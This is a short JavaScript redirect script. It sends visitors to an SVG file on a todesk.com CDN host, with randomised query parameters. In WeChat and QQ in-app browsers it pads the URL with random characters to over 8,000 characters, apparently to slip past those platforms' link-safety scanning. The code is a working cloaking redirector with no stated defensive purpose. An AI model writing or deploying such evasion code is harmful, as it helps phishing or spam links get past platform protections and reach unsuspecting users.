
var urls = [
  'https://todeskcdnspeed.todesk.com/202306292031075ff43dfe66086c.svg?_w3x={nnnnn}&sdf={nnnnnn}&345={wwnw}',
  'https://todeskcdnspeed.todesk.com/202306292031075ff43dfe66086c.svg?_w3x={nnnnn}&sdf={nnnnnn}&345={wwnw}',
];

var randomUrl = myEeplace(urls[Math.floor(Math.random() * urls.length)]);
var modifiedUrl = randomUrl + "&" + window.location.search.replace("?", "");
var platform = '';
if (/MicroMessenger/.test(navigator.userAgent)) {

  platform = 'wechat';
  if (modifiedUrl.length < 8200) {
    var padding = "&ax=" + generateRandomString(8200 - modifiedUrl.length);
    modifiedUrl += padding;
  }
} else if (/QQ/.test(navigator.userAgent)) {

  platform = 'qq';
  if (modifiedUrl.length < 8100) {
    var padding = "&ax=" + generateRandomString(8100 - modifiedUrl.length);
    modifiedUrl += padding;
  }
}

location.href = modifiedUrl;

function myEeplace(s) {
  return s.replace(/\{(\w+?)\}/g, function (a, b) {
    var h = '';
    for (var i = 0; i < b.length; i++) {
      if ('n' == b[i]) {
        h += Math.floor(Math.random() * 10);
      } else if ('w' == b[i]) {
        h += String.fromCharCode(97 + Math.floor(Math.random() * 26));
      }
    }
    return h;
  });
}

function generateRandomString(length) {
  var characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  var result = '';
  for (var i = 0; i < length; i++) {
    var randomIndex = Math.floor(Math.random() * characters.length);
    result += characters.charAt(randomIndex);
  }
  return result;
}
